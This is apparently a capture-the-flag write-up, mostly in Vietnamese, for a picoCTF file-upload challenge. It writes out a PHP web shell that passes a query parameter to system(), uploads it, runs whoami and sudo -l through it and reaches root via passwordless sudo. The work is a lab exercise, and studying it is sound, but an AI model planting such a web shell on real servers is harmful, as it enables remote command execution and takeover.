Sau khi up ảnh lên chúng ta thấy sau đó ảnh sẽ  bị thu hồi để giải phóng bộ nhớ

Inspector và xem đoạn code ở thẻ script


        var loadFile = function(event) {
            var input = event.target;
            var file = input.files[0];
            var type = file.type;
            var output = document.getElementById('preview_img');


            output.src = URL.createObjectURL(event.target.files[0]);
            output.onload = function() {
                URL.revokeObjectURL(output.src) // free memory
            }
        };

Cách solve lỗ hổng:

tạo 1 file shell.php và chèn code :

<?php
if(isset($_GET['cmd'])){
    echo "<pre>";
    $cmd = $_GET['cmd'];  // Get command from the query string
    system($cmd);         // Execute the command and display output
    echo "</pre>";
}
?>

Upload code lên sẽ được 1 hint:

![image](https://github.com/user-attachments/assets/b66614c6-c341-490e-b8db-973bea3e7f8a)

Then any Command can be Executed through Triggering the path:
Endpoint: uploads/shell.php?cmd=
http://standard-pizzas.picoctf.net:63914/uploads/shell.php?cmd=

sau đó 
http://standard-pizzas.picoctf.net:63914/uploads/shell.php?cmd=whoami

![image](https://github.com/user-attachments/assets/f291ce4c-c8a2-4a82-9061-c6ea0182bad4)

xem các quyền của người dùng hiện tại : sudo -l

![image](https://github.com/user-attachments/assets/6e9f416b-f83f-48c9-9ef1-53558b6a7aa7)

Vì vậy, không cần mật khẩu để truy cập bất kỳ người dùng nào cũng như root.

Bây giờ chúng ta hãy lấy cờ làm người dùng root:

![image](https://github.com/user-attachments/assets/ba69851e-de20-49e8-b61b-7f1401b08a9c)
